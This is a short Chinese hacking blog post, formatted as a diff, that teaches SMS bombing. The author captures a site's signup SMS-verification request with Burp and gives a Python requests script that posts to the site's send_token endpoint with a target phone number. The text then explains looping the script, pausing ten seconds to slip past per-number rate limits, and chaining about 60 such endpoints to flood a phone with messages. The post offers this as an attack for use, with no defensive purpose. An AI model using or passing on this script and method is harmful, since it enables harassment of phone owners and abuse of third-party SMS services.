@@ -1,0 +1,17 @@
+大家好，我是1ee（因为在作家群，就不加Hacker这个前缀了，怕被大佬打。。）
+刚加入i春秋作家组希望大家多多关照，也欢迎大家找我交流
+今天我来讲讲我最近找到的一个小思路，利用python进行短信轰炸
+首先
+这是一个网站，他的业务存在短信发送
+这个时候，我们打开神器burp或者其他抓包工具（最好用burp，因为repeater模块可以满足我们的需要）
+这时候我给我的火狐挂上代理，然后burp开启拦截
+抓到了一个包，发送到repeater
+进入repeater分析数据包
+{"mobile":"13xxxxxx","type":"signup"}
+这个是发送的数据，go走起
+看返回的包可以看到是成功的
+然后开始写我们的python进行循环发包对目标进行轰炸
+import requests import json headers = {'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0','Cookie': 'da_a=77206194','Referer': 'http://www.demlution.com/'} #data = #print data r = requests.post('/capi/v1/dmhome/send_token',data=json.dumps({"mobile":"手机号码","type":"signup"}),headers=headers) print(r.text)
+先进行测试，测试完成后可以for循环加强脚本的威力，经过我的研究发现当一个号码多次提交后会被ban，如我一次性发了10个包后（也就是发了十条短信）之后的这个号码就不会再发了，即使返回的包状态是成功，但是短信是发不到的，其实我们可以停顿十秒再发下一个，这样就不会被ban，这也是测试知道的
+好了，今天我就说道这吧，可能大家会说就一个号码我直接加入黑名单就ok了，的确，但是我们可以挖掘这类型的网站，然后一个一个接口发送一次，60个接口，一秒钟就60条短信，威力还是可以的，附上成功的图片
+>>>>>> 黑客入门必备技能 带你入坑和逗比表哥们一起聊聊黑客的事儿，他们说高精尖的技术比农药都好玩~
